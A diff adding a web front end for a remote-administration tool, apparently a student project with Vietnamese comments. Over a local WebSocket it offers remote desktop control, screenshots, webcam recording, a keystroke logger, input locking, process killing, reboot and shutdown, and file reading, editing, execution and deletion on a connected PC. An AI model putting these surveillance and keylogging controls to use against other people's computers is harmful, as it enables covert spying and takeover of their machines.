+        btn.style.color = "#00ff41"; 
+        btn.innerText = "🎮 CONTROL: ON";
+        img.style.cursor = "crosshair"; // Đổi con trỏ chuột
+        
+        // Gắn sự kiện
+        setupInputListeners(img);
+        
+        // Tự động chụp màn hình liên tục để thấy phản hồi (FPS thấp thôi để đỡ lag)
+        window.remoteInterval = setInterval(() => {
+                                    // Thêm payload {save: false} để Server biết đừng lưu ảnh này
+                                    send('SCREEN', 'CAPTURE_BINARY', { save: false });
+                                }, 100);
+    } else {
+        btn.style.color = ""; 
+        btn.innerText = "🎮 CONTROL: OFF";
+        img.style.cursor = "default";
+        
+        // Gỡ sự kiện
+        removeInputListeners(img);
+        clearInterval(window.remoteInterval);
+    }
+}
+
+// --- GẮN SỰ KIỆN ---
+function setupInputListeners(element) {
+    // Chuột
+    element.addEventListener('mousemove', onRemoteMouseMove);
+    element.addEventListener('mousedown', onRemoteMouseDown);
+    element.addEventListener('mouseup', onRemoteMouseUp);
+    element.addEventListener('contextmenu', (e) => e.preventDefault()); // Cho phép chuột phải
+    element.addEventListener('wheel', onRemoteWheel, {passive: false}); // Lăn chuột
+
+    // Phím (Gắn vào window để bắt toàn cục)
+    window.addEventListener('keydown', onRemoteKeyDown);
+    window.addEventListener('keyup', onRemoteKeyUp);
+}
+
+function removeInputListeners(element) {
+    element.removeEventListener('mousemove', onRemoteMouseMove);
+    element.removeEventListener('mousedown', onRemoteMouseDown);
+    element.removeEventListener('mouseup', onRemoteMouseUp);
+    element.removeEventListener('contextmenu', (e) => e.preventDefault());
+    element.removeEventListener('wheel', onRemoteWheel);
+    window.removeEventListener('keydown', onRemoteKeyDown);
+    window.removeEventListener('keyup', onRemoteKeyUp);
+}
+
+// --- LOGIC TÍNH TOẠ ĐỘ CHUẨN XÁC ---
+function sendMouse(cmd, e, type=null) {
+    const img = document.getElementById('main-view');
+    
+    // Lấy kích thước hiển thị thực tế của thẻ IMG
+    const rect = img.getBoundingClientRect();
+
+    // 1. Tính toạ độ chuột so với góc trái trên của ẢNH (không phải màn hình)
+    let clientX = e.clientX - rect.left;
+    let clientY = e.clientY - rect.top;
+
+    // 2. Tính tỷ lệ (0.0 đến 1.0)
+    // Lưu ý: rect.width/height ở đây là kích thước hiển thị trên web
+    const xRel = clientX / rect.width;
+    const yRel = clientY / rect.height;
+
+    // 3. Gửi sang Server
+    // Chỉ gửi nếu chuột nằm trong phạm vi ảnh (tránh click vào viền đen)
+    if (xRel >= 0 && xRel <= 1 && yRel >= 0 && yRel <= 1) {
+        let btn = 'left';
+        if (e.button === 2) btn = 'right';
+        if (e.button === 1) btn = 'middle';
+
+        send('INPUT', cmd, { 
+            x: xRel, 
+            y: yRel, 
+            btn: btn, 
+            type: type 
+        });
+    }
+}
+
+function onRemoteMouseMove(e) {
+    const now = Date.now();
+    if (now - lastMove < 50) return; // Giới hạn gửi 20 lần/giây để không nghẽn mạng
+    lastMove = now;
+    sendMouse('MOUSE_MOVE', e);
+}
+
+function onRemoteMouseDown(e) { sendMouse('MOUSE_BTN', e, 'down'); }
+function onRemoteMouseUp(e) { sendMouse('MOUSE_BTN', e, 'up'); }
+
+function onRemoteWheel(e) {
+    e.preventDefault();
+    // Server cần số âm để cuộn xuống, dương để lên (ngược với JS một chút tùy trình duyệt)
+    let delta = (e.deltaY > 0) ? -120 : 120; 
+    send('INPUT', 'MOUSE_WHEEL', { delta: delta });
+}
+
+// --- XỬ LÝ PHÍM ---
+function onRemoteKeyDown(e) {
+    if (!isRemoteControl) return;
+    e.preventDefault(); // Chặn phím tắt trình duyệt (F5, Ctrl+S...)
+    send('INPUT', 'KEY_EVENT', { key: e.keyCode, type: 'down' });
+}
+
+function onRemoteKeyUp(e) {
+    if (!isRemoteControl) return;
+    e.preventDefault();
+    send('INPUT', 'KEY_EVENT', { key: e.keyCode, type: 'up' });
+}
+</script>
+</body>
+</html> -->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>REMOTE_OPS // V14_FULL_CONTROL</title>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <style>
+        /* --- CORE DARK THEME --- */
+        :root { --bg-color: #050505; --panel-bg: rgba(12, 14, 12, 0.98); --main-color: #00ff41; --accent-color: #00f7ff; --alert-color: #ff3333; --border: 1px solid #333; }
+        * { box-sizing: border-box; }
+        body { font-family: 'Share Tech Mono', monospace; background-color: var(--bg-color); color: var(--main-color); margin: 0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; user-select: none; }
+        
+        /* HEADER */
+        .header { padding: 8px 15px; border-bottom: 2px solid var(--main-color); background: #001100; display: flex; justify-content: space-between; align-items: center; height: 50px; }
+        .brand { font-size: 22px; font-weight: bold; letter-spacing: 2px; } .brand span { color: var(--accent-color); }
+        input, button, textarea { font-family: 'Share Tech Mono'; padding: 5px 10px; background: #000; color: var(--main-color); border: 1px solid var(--main-color); outline: none; transition: 0.2s; }
+        button:hover { background: var(--main-color); color: #000; cursor: pointer; box-shadow: 0 0 8px var(--main-color); }
+        .btn-red { border-color: var(--alert-color); color: var(--alert-color); }
+        .btn-red:hover { background: var(--alert-color); color: #fff; box-shadow: 0 0 8px var(--alert-color); }
+
+        /* LAYOUT */
+        .main-grid { display: grid; grid-template-columns: 320px 1fr; height: calc(100vh - 50px); }
+        .panel { background: var(--panel-bg); border-right: var(--border); padding: 10px; display: flex; flex-direction: column; overflow: hidden; }
+        .right-panel { background: #000; display: flex; flex-direction: column; position: relative; overflow: hidden; }
+
+        /* TABS */
+        .tab-bar { display: flex; gap: 5px; margin-bottom: 15px; border-bottom: 1px solid #333; padding-bottom: 10px; }
+        .tab-btn { flex: 1; border: none; background: #111; color: #666; font-size: 12px; font-weight: bold; }
+        .tab-btn.active { background: var(--main-color); color: #000; }
+
+        /* CONTROL GROUPS */
+        .ctrl-group { border: 1px dashed #333; padding: 10px; margin-bottom: 10px; background: rgba(0,255,0,0.02); }
+        .ctrl-title { font-size: 11px; color: #666; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 1px; font-weight: bold; }
+        .btn-row { display: flex; gap: 5px; margin-bottom: 5px; } .btn-row button { flex: 1; }
+        .input-row { display: flex; gap: 5px; margin-bottom: 5px; } 
+        .input-row input { flex: 2; font-size: 11px; } .input-row button { flex: 1; font-size: 11px; }
+
+        .key-box { width: 100%; height: 80px; background: #080808; border: 1px solid #333; color: #0f0; font-size: 11px; resize: none; margin-top: 5px; padding: 5px; font-family: 'Fira Code', monospace; }
+
+        /* EXPLORER & PREVIEW */
+        .address-bar { display: flex; background: #111; border-bottom: 1px solid #333; padding: 8px; gap: 5px; align-items: center; color: #fff; font-size: 13px; }
+        .crumb { cursor: pointer; color: #888; } .crumb:hover { color: #fff; text-decoration: underline; }
+        .file-grid { flex-grow: 1; overflow-y: auto; padding: 10px; display: grid; grid-template-columns: repeat(auto-fill, minmax(90px, 1fr)); gap: 10px; align-content: start; }
+        
+        .file-item { display: flex; flex-direction: column; align-items: center; text-align: center; padding: 10px; border: 1px solid transparent; border-radius: 4px; cursor: pointer; color: #ccc; }
+        .file-item:hover { background: #112211; border-color: #004400; color: #fff; }
+        .file-icon { font-size: 36px; margin-bottom: 5px; }
+        .file-name { font-size: 11px; word-break: break-all; line-height: 1.3; max-height: 2.6em; overflow: hidden; }
+
+        .preview-area { flex-grow: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; background: #000; position: relative; overflow: hidden; }
+        .preview-area img { max-width: 100%; max-height: 100%; width: auto; height: auto; object-fit: contain; cursor: crosshair; }
+        video { max-width: 100%; max-height: 100%; object-fit: contain; }
+
+        /* MODALS & LOGS */
+        #context-menu { position: absolute; display: none; background: #111; border: 1px solid var(--main-color); z-index: 1000; min-width: 150px; box-shadow: 0 5px 15px rgba(0,0,0,0.8); }
+        .ctx-item { padding: 10px 15px; cursor: pointer; font-size: 12px; border-bottom: 1px solid #222; }
+        .ctx-item:hover { background: var(--main-color); color: #000; }
+
+        .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 2000; display: none; flex-direction: column; }
+        .modal-content { flex-grow: 1; display: flex; flex-direction: column; margin: 20px; border: 1px solid var(--main-color); background: #111; }
+        .modal-header { padding: 10px; background: #002200; border-bottom: 1px solid var(--main-color); display: flex; justify-content: space-between; align-items: center; }
+        #editor-text { flex-grow: 1; background: #0c0c0c; color: #e0e0e0; border: none; padding: 15px; font-family: 'Fira Code', monospace; resize: none; outline: none; font-size: 14px; line-height: 1.6; }
+
+        #log-area { height: 30px; background: #050505; border-top: 1px solid #333; font-size: 11px; color: #00ff41; padding: 5px 10px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .hidden { display: none !important; }
+        .active-remote { border: 2px solid var(--alert-color) !important; color: var(--alert-color) !important; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="brand">REMOTE<span>OPS</span></div>
+        <div style="display:flex; gap:10px;">
+            <input type="text" id="ip" value="ws://localhost:9010" style="width:200px; text-align:center;">
+            <button onclick="connect()">CONNECT SYSTEM</button>
+        </div>
+    </div>
+
+    <div class="main-grid">
+        <div class="panel">
+            <div class="tab-bar">
+                <button class="tab-btn active" onclick="switchTab('control')">CONTROLS</button>
+                <button class="tab-btn" onclick="switchTab('explorer')">EXPLORER</button>
+                <button class="tab-btn" onclick="switchTab('gallery')">GALLERY</button>
+            </div>
+
+            <div id="tab-control" style="overflow-y: auto;">
+                
+                <div class="ctrl-group">
+                    <div class="ctrl-title">APPLICATION CONTROL</div>
+                    <div class="input-row">
+                        <input type="text" id="app-input" placeholder="e.g: chrome, notepad, calc">
+                        <button onclick="startApp()">OPEN APP</button>
+                    </div>
+                    <div class="input-row">
+                        <input type="text" id="kill-app-input" placeholder="App Name (e.g: chrome)">
+                        <button class="btn-red" onclick="killApp()">KILL APP</button>
+                    </div>
+                    <button onclick="send('APP','LIST')" style="width:100%; margin-top:5px;">LIST RUNNING APPS</button>
+                </div>
+
+                <div class="ctrl-group">
+                    <div class="ctrl-title">PROCESS MANAGER</div>
+                    <div class="input-row">
+                        <input type="text" id="proc-cmd-input" placeholder="Full Cmd Path">
+                        <button onclick="startProcess()">START PROC</button>
+                    </div>
+                    <div class="input-row">
+                        <input type="number" id="kill-pid-input" placeholder="PID">
+                        <button class="btn-red" onclick="killProcess()">KILL PID</button>
+                    </div>
+                    <button onclick="send('PROCESS','LIST')" style="width:100%; margin-top:5px;">REFRESH PROCESS LIST</button>
+                </div>
+
+                <div class="ctrl-group">
+                    <div class="ctrl-title">SYSTEM POWER</div>
+                    <div class="btn-row">
+                        <button class="btn-red" onclick="if(confirm('Reboot remote PC?')) send('SYSTEM','RESTART')">REBOOT</button>
+                        <button class="btn-red" onclick="if(confirm('Shutdown remote PC?')) send('SYSTEM','SHUTDOWN')">SHUTDOWN</button>
+                    </div>
+                </div>
+
+                <div class="ctrl-group">
+                    <div class="ctrl-title">SURVEILLANCE</div>
+                    <div class="btn-row">
+                        <button onclick="takeScreenshot()">📷 SCREENSHOT</button>
+                        <button onclick="startWebcam()">▶ WEBCAM</button>
+                    </div>
+                    <button class="btn-red" onclick="stopWebcam()" style="width:100%">■ STOP CAM & SAVE</button>
+                </div>
+
+                <div class="ctrl-group">
+                    <div class="ctrl-title">REMOTE DESKTOP</div>
+                    <button id="btn-remote" onclick="toggleRemote()" style="width:100%; height:40px; font-weight:bold; border: 2px solid var(--accent-color); color:var(--accent-color);">
+                        🎮 START REMOTE CONTROL
+                    </button>
+                </div>
+
+                <div class="ctrl-group">
+                    <div class="ctrl-title">KEYLOGGER & SECURITY</div>
+                    <div class="btn-row">
+                        <button onclick="send('KEYBOARD','START')">REC KEYS</button>
+                        <button class="btn-red" onclick="send('KEYBOARD','STOP')">STOP</button>
+                    </div>
+                    <textarea id="key-stream" class="key-box" readonly placeholder="> Keystrokes will appear here..."></textarea>
+                    <div class="btn-row" style="margin-top:5px;">
+                        <button class="btn-red" onclick="send('KEYBOARD','LOCK')">🔒 LOCK INPUT</button>
+                        <button onclick="send('KEYBOARD','UNLOCK')">🔓 UNLOCK</button>
+                    </div>
+                </div>
+            </div>
+
+            <div id="tab-explorer" class="hidden" style="display:flex; flex-direction:column; height:100%;">
+                <div class="ctrl-group">
+                    <div class="ctrl-title">QUICK NAVIGATION</div>
+                    <button onclick="send('FILE','LIST_DIR',{path:''})" style="width:100%; margin-bottom:5px;">💻 MY COMPUTER</button>
+                    <button onclick="refresh()" style="width:100%">↻ REFRESH CURRENT</button>
+                </div>
+                <div style="flex-grow:1; border:1px solid #333; padding:10px; color:#666; font-size:11px;">
+                    * Select files in the main view for actions.
+                </div>
+            </div>
+
+            <div id="tab-gallery" class="hidden" style="display:flex; flex-direction:column; height:100%;">
+                <button onclick="send('FILE','LIST')" style="margin-bottom: 5px;">↻ RELOAD MEDIA</button>
+                <div id="file-list-box" style="flex-grow: 1; overflow-y: auto; border: 1px solid #333;">
+                    <div style="padding:10px; color:#666; text-align:center;">Empty</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="right-panel">
+            <div id="explorer-view" class="hidden" style="height:100%; display:flex; flex-direction:column;">
+                <div class="address-bar" id="breadcrumbs"><span>Waiting for connection...</span></div>
+                <div class="file-grid" id="file-grid"></div>
+            </div>
+
+            <div id="media-view" class="preview-area">
+                <div id="view-label" style="position:absolute; top:10px; left:10px; background:rgba(0,0,0,0.7); padding:2px 8px; font-size:11px; border-radius:4px; z-index:10;">IDLE</div>
+                <img id="main-view" alt="">
+                <video id="video-player" controls class="hidden"></video>
+            </div>
+
+            <div id="log-area">> System Ready.</div>
+        </div>
+    </div>
+
+    <div id="context-menu">
+        <div class="ctx-item" onclick="ctxSmartOpen()"><span>🚀</span> Open / Run / Edit</div>
+        <div class="ctx-item" onclick="ctxDownload()"><span>⬇</span> Download File</div>
+        <div class="ctx-item" onclick="ctxDelete()" style="color:var(--alert-color)"><span>❌</span> Delete Permanently</div>
+    </div>
+
+    <div id="editor-modal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <span id="editor-title" style="font-weight:bold; color:var(--main-color);">EDITING FILE</span>
+                <div>
+                    <button onclick="saveFile()" style="margin-right:5px;">💾 SAVE OVERWRITE</button>
+                    <button class="btn-red" onclick="closeEditor()">CLOSE</button>
+                </div>
+            </div>
+            <textarea id="editor-text"></textarea>
+        </div>
+    </div>
+
+    <canvas id="record-canvas" style="display:none;"></canvas>
+
+<script>
+    // --- VARIABLES ---
+    let ws = null;
+    let currentPath = "";
+    let selectedFile = null;
+    
+    // Remote Control
+    let isRemoteControl = false;
+    let isStreaming = false;
+    let lastMouseSend = 0;
+
+    // Media Rec
+    let mediaRecorder = null;
+    let recordedChunks = [];
+    let isRecording = false;
+    const canvas = document.getElementById('record-canvas');
+    const ctx = canvas.getContext('2d');
+
+    // --- UTILS ---
+    function log(msg) { 
+        const d = new Date();
+        const time = d.getHours() + ":" + d.getMinutes() + ":" + d.getSeconds();
+        document.getElementById('log-area').innerText = `[${time}] ${msg}`; 
+    }
+    
+    function isTextFile(name) {
+        const exts = ['.txt','.cpp','.h','.hpp','.c','.js','.html','.css','.json','.xml','.log','.ini','.bat','.cmd','.py','.sh'];
+        return exts.some(ext => name.toLowerCase().endsWith(ext));
+    }
+
+    // --- CONNECT ---
+    function connect() {
+        const url = document.getElementById('ip').value;
+        ws = new WebSocket(url);
+        ws.binaryType = "arraybuffer";
+        
+        ws.onopen = () => { 
+            log("CONNECTED TO SERVER"); 
+            send('FILE','LIST_DIR',{path:''}); // Load root
+        };
+        
+        ws.onclose = () => { 
+            log("DISCONNECTED"); 
+            toggleRemote(false); 
+        };
+        
+        ws.onmessage = handleMessage;
+    }
+
+    function send(mod, cmd, payload={}) {
+        if(ws && ws.readyState === WebSocket.OPEN) {
+            ws.send(JSON.stringify({module:mod, command:cmd, payload:payload}));
+        } else {
+            log("Error: Not Connected");
+        }
+    }
+
+    // --- MESSAGE HANDLING ---
+    function handleMessage(evt) {
+        if (evt.data instanceof ArrayBuffer) {
+            handleBinary(evt.data);
+        } else {
+            try { handleJson(JSON.parse(evt.data)); } catch(e) { console.error(e); }
+        }
+    }
+
+    function handleBinary(data) {
+        const blob = new Blob([data]);
+        
+        // 1. Download File Mode
+        if (selectedFile && selectedFile.downloading) {
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a'); a.href = url; a.download = selectedFile.name; a.click();
+            selectedFile.downloading = false;
+            log("Download complete: " + selectedFile.name);
+            return;
+        }
+
+        // 2. Video Playback Mode (Khi click vào file .webm trong Gallery)
+        if (selectedFile && selectedFile.playingVideo) {
+            const videoBlob = new Blob([data], { type: 'video/webm' });
+            const url = URL.createObjectURL(videoBlob);
+            const player = document.getElementById('video-player');
+            player.src = url;
+            player.play();
+            selectedFile.playingVideo = false;
+            log("Playing video...");
+            return;
+        }
+
+        // 3. Stream/Image Mode (Remote Desktop / Webcam)
+        const url = URL.createObjectURL(blob);
+        const img = document.getElementById('main-view');
+        
+        // Double buffer trick to prevent flickering
+        const temp = new Image();
+        temp.onload = () => {
+            img.src = url;
+            if (isStreaming) requestAnimationFrame(requestNextFrame); // Loop for remote
+        };
+        temp.src = url;
+
+        // Draw to canvas for recording if active
+        if(isRecording) {
+            if(canvas.width !== temp.width) { canvas.width = temp.width; canvas.height = temp.height; }
+            ctx.drawImage(temp, 0, 0);
+        }
+    }
+
+    function handleJson(res) {
+        if (res.status === 'error') { log("ERROR: " + res.message); return; }
+
+        if (res.command === 'LIST_DIR') renderExplorer(res);
+        else if (res.command === 'READ_TEXT') openEditor(res);
+        else if (res.command === 'WRITE_TEXT') { alert("File Saved!"); closeEditor(); refresh(); }
+        else if (res.command === 'DELETE') { log("Deleted."); refresh(); }
+        else if (res.command === 'EXECUTE') { log("Executed: " + res.message); }
+        
+        else if (res.module === 'KEYBOARD') {
+            const box = document.getElementById('key-stream');
+            box.value += res.data.key;
+            box.scrollTop = box.scrollHeight;
+        }
+        
+        else if (res.module === 'FILE' && res.command === 'LIST') renderGallery(res.data);
+        else if (res.command === 'SAVE_VIDEO') { log("Video Saved to Server!"); send('FILE','LIST'); }
+        
+        // --- APP & PROCESS LIST ---
+        else if (res.module === 'APP' && res.command === 'LIST') {
+            console.log("APP LIST:", res.data);
+            alert("App List loaded in Console (F12)");
+        }
+        else if (res.module === 'PROCESS' && res.command === 'LIST') {
+            console.log("PROCESS LIST:", res.data.process_list);
+            alert("Process List loaded in Console (F12)");
+        }
+        else if (res.module === 'APP' && res.command === 'START') { log("App Started: " + res.input); }
+        else if (res.module === 'APP' && res.command === 'KILL') { log(`Killed ${res.data.killed_count} process(es) matching '${res.data.keyword}'`); }
+        else if (res.module === 'PROCESS' && res.command === 'KILL') { log("Killed PID: " + res.pid); }
+    }
+
+    // --- APP & PROCESS FUNCTIONS ---
+    function startApp() {
+        const name = document.getElementById('app-input').value;
+        if(name) send('APP', 'START', {path: name});
+    }
+    function killApp() {
+        const name = document.getElementById('kill-app-input').value;
+        if(name) send('APP', 'KILL', {name: name});
+    }
+    function startProcess() {
+        const path = document.getElementById('proc-cmd-input').value;
+        if(path) send('PROCESS', 'START', {path: path});
+    }
+    function killProcess() {
+        const pid = document.getElementById('kill-pid-input').value;
+        if(pid) send('PROCESS', 'KILL', {pid: parseInt(pid)});
+    }
+
+    // --- REMOTE DESKTOP CORE ---
+    function toggleRemote(forceState) {
+        if (forceState !== undefined) isRemoteControl = forceState;
+        else isRemoteControl = !isRemoteControl;
+
+        const btn = document.getElementById('btn-remote');
+        const img = document.getElementById('main-view');
+        
+        if (isRemoteControl) {
+            // ON
+            btn.innerHTML = "🔴 STOP REMOTE CONTROL";
+            btn.classList.add('active-remote');
+            img.style.cursor = "crosshair"; 
+            document.getElementById('view-label').innerText = "REMOTE CONTROL ACTIVE";
+            
+            // Start Stream Loop
+            isStreaming = true;
+            requestNextFrame();
+            
+            // Attach Input Events
+            setupInput(img);
+            switchTab('control'); // Force view
+            
+        } else {
+            // OFF
+            btn.innerHTML = "🎮 START REMOTE CONTROL";
+            btn.classList.remove('active-remote');
+            img.style.cursor = "default";
+            document.getElementById('view-label').innerText = "IDLE";
+            
+            isStreaming = false;
+            removeInput(img);
+        }
+    }
+
+    function requestNextFrame() {
+        if(!isStreaming) return;
+        // save: false -> Server just sends RAM buffer, no disk write
+        send('SCREEN', 'CAPTURE_BINARY', { save: false });
+    }
+
+    // --- INPUT HANDLING ---
+    function setupInput(el) {
+        el.onmousemove = (e) => {
+            if (Date.now() - lastMouseSend < 40) return; // Throttle 25fps
+            lastMouseSend = Date.now();
+            sendMouse('MOUSE_MOVE', e);
+        };
+        el.onmousedown = (e) => sendMouse('MOUSE_BTN', e, 'down');
+        el.onmouseup   = (e) => sendMouse('MOUSE_BTN', e, 'up');
+        el.oncontextmenu = (e) => { e.preventDefault(); };
+        el.onwheel = (e) => {
+            e.preventDefault();
+            send('INPUT', 'MOUSE_WHEEL', { delta: (e.deltaY > 0 ? -120 : 120) });
+        };
+        
+        window.onkeydown = (e) => { if(isRemoteControl) { e.preventDefault(); send('INPUT','KEY_EVENT',{key:e.keyCode, type:'down'}); }};
+        window.onkeyup   = (e) => { if(isRemoteControl) { e.preventDefault(); send('INPUT','KEY_EVENT',{key:e.keyCode, type:'up'}); }};
+    }
+
+    function removeInput(el) {
+        el.onmousemove = null; el.onmousedown = null; el.onmouseup = null; el.onwheel = null;
+        window.onkeydown = null; window.onkeyup = null;
+    }
+
+    function sendMouse(cmd, e, type=null) {
+        const img = document.getElementById('main-view');
+        const rect = img.getBoundingClientRect();
+        
+        // Calculate relative pos (0.0 - 1.0) based on ACTUAL image size
+        const x = (e.clientX - rect.left) / rect.width;
+        const y = (e.clientY - rect.top) / rect.height;
+        
+        let btn = 'left';
+        if(e.button===1) btn='middle'; 
+        if(e.button===2) btn='right';
+
+        if(x>=0 && x<=1 && y>=0 && y<=1) {
+            send('INPUT', cmd, {x, y, btn, type});
+        }
+    }
+
+    // --- EXPLORER LOGIC ---
+    function renderExplorer(res) {
+        currentPath = res.current_path;
+        renderBreadcrumbs(currentPath);
+        
+        const grid = document.getElementById('file-grid');
+        grid.innerHTML = "";
+        
+        const list = res.data.sort((a,b) => (a.type==='drive'?0:a.type==='dir'?1:2) - (b.type==='drive'?0:b.type==='dir'?1:2));
+
+        list.forEach(f => {
+            const div = document.createElement('div');
+            div.className = 'file-item';
+            let icon = f.type==='drive'?'💽': f.type==='dir'?'📁': f.type==='image'?'🖼️': '📄';
+            div.innerHTML = `<div class="file-icon">${icon}</div><div class="file-name">${f.name}</div>`;
+            
+            div.onclick = () => {
+                if(f.type==='dir'||f.type==='drive') send('FILE','LIST_DIR',{path:f.path});
+                else { selectedFile=f; ctxSmartOpen(); }
+            };
+            div.oncontextmenu = (e) => {
+                e.preventDefault(); selectedFile=f;
+                const menu = document.getElementById('context-menu');
+                menu.style.display='block'; menu.style.left=e.clientX+'px'; menu.style.top=e.clientY+'px';
+            };
+            grid.appendChild(div);
+        });
+    }
+
+    function renderBreadcrumbs(path) {
+        const b = document.getElementById('breadcrumbs');
+        if(!path) { b.innerHTML = "<span class='crumb' onclick=\"send('FILE','LIST_DIR',{path:''})\">MY COMPUTER</span>"; return; }
+        
+        b.innerHTML = "<span class='crumb' onclick=\"send('FILE','LIST_DIR',{path:''})\">PC</span>";
+        const parts = path.split(/[\\/]/).filter(p=>p);
+        let build = "";
+        parts.forEach(p => {
+            build += (build==="" && p.includes(':') ? p+"\\" : (build===""?p:"\\"+p));
+            b.innerHTML += ` <span style="color:#555">></span> <span class='crumb' onclick="send('FILE','LIST_DIR',{path:'${build.replace(/\\/g,'\\\\')}'})">${p}</span>`;
+        });
+    }
+
+    function ctxSmartOpen() {
+        document.getElementById('context-menu').style.display='none';
+        if(!selectedFile) return;
+        if(isTextFile(selectedFile.name)) send('FILE','READ_TEXT',{path:selectedFile.path});
+        else if(confirm("Run/Execute "+selectedFile.name+" on Server?")) send('FILE','EXECUTE',{path:selectedFile.path});
+    }
+    function ctxDownload() {
+        document.getElementById('context-menu').style.display='none';
+        selectedFile.downloading = true;
+        send('FILE','GET',{name:selectedFile.path});
+    }
+    function ctxDelete() {
+        document.getElementById('context-menu').style.display='none';
+        if(confirm("Delete "+selectedFile.name+"?")) send('FILE','DELETE',{path:selectedFile.path});
+    }
+    
+    // --- EDITOR ---
+    function openEditor(res) {
+        document.getElementById('editor-modal').style.display='flex';
+        document.getElementById('editor-text').value = res.content;
+        document.getElementById('editor-title').innerText = "EDIT: " + res.path;
+        selectedFile = { path: res.path };
+    }
+    function saveFile() {
+        send('FILE','WRITE_TEXT',{path:selectedFile.path, content:document.getElementById('editor-text').value});
+    }
+    function closeEditor() { document.getElementById('editor-modal').style.display='none'; }
+
+    // --- GALLERY & TABS ---
+    function renderGallery(data) {
+        const list = document.getElementById('file-list-box'); list.innerHTML = "";
+        data.reverse().forEach(f => {
+            const div = document.createElement('div');
+            div.style.padding="8px"; div.style.borderBottom="1px solid #222"; div.style.cursor="pointer";
+            div.style.fontSize="11px"; div.style.display="flex"; div.style.justifyContent="space-between";
+            div.innerHTML = `<span>${f.name}</span> <span style="color:#666">${(f.size/1024).toFixed(1)} KB</span>`;
+            
+            div.onclick = () => {
+                document.getElementById('main-view').classList.add('hidden');
+                document.getElementById('video-player').classList.add('hidden');
+                
+                if(f.name.endsWith('.webm') || f.name.endsWith('.mp4')) {
+                    // FIX VIDEO PLAYBACK
+                    const v = document.getElementById('video-player');
+                    v.classList.remove('hidden');
+                    // Gắn cờ để handleMessage biết đây là video data
+                    selectedFile = { name: f.name, playingVideo: true };
+                    send('FILE','GET',{name:f.name});
+                } else {
+                    const i = document.getElementById('main-view'); i.classList.remove('hidden');
+                    // Ảnh thì tải như bình thường
+                    ws.onmessage = (e) => { 
+                        if (e.data instanceof ArrayBuffer) {
+                            i.src = URL.createObjectURL(new Blob([e.data])); 
+                            ws.onmessage = handleMessage; 
+                        }
+                    };
+                    send('FILE','GET',{name:f.name});
+                }
+            };
+            list.appendChild(div);
+        });
+    }
+
+    function switchTab(t) {
+        document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
+        document.querySelector(`button[onclick="switchTab('${t}')"]`).classList.add('active');
+        ['tab-control','tab-explorer','tab-gallery'].forEach(id=>document.getElementById(id).classList.add('hidden'));
+        ['explorer-view','media-view'].forEach(id=>document.getElementById(id).classList.add('hidden'));
+
+        document.getElementById('tab-'+t).classList.remove('hidden');
+        if(t==='explorer') {
+            document.getElementById('explorer-view').classList.remove('hidden');
+            send('FILE','LIST_DIR',{path:currentPath});
+        } else {
+            document.getElementById('media-view').classList.remove('hidden');
+            if(t==='gallery') send('FILE','LIST');
+        }
+        
+        // Reset player if leaving gallery
+        if(t!=='gallery') { 
+            document.getElementById('video-player').classList.add('hidden'); 
+            document.getElementById('main-view').classList.remove('hidden');
+            // Dừng stream webcam nếu đang chạy để tiết kiệm
+            if(isRecording) stopWebcam();
+        }
+    }
+
+    // --- OTHER ---
+    function takeScreenshot() { switchTab('control'); send('SCREEN','CAPTURE_BINARY',{save:true}); }
+    function refresh() { send('FILE','LIST_DIR',{path:currentPath}); }
+    
+    // Webcam Rec
+    function startWebcam() { 
+        send('WEBCAM','START_STREAM'); 
+        isRecording=true; recordedChunks=[];
+        // 25 FPS Stream Record
+        mediaRecorder = new MediaRecorder(canvas.captureStream(25));
+        mediaRecorder.ondataavailable = e => { if(e.data.size>0) recordedChunks.push(e.data); };
+        mediaRecorder.onstop = () => {
+            const blob = new Blob(recordedChunks, {type:'video/webm'});
+            const reader = new FileReader();
+            reader.readAsDataURL(blob);
+            reader.onloadend = () => {
+                const b64 = reader.result.split(',')[1];
+                send('FILE','SAVE_VIDEO',{name:`cam_${Date.now()}.webm`, data:b64});
+            };
+        };
+        mediaRecorder.start();
+        document.getElementById('view-label').innerText = "🔴 RECORDING WEBCAM...";
+    }
+    function stopWebcam() { 
+        send('WEBCAM','STOP_STREAM'); 
+        if(isRecording && mediaRecorder) { mediaRecorder.stop(); isRecording=false; }
+        document.getElementById('view-label').innerText = "IDLE";
+    }
+
+    document.onclick = () => document.getElementById('context-menu').style.display='none';
+</script>
+</body>
+</html>
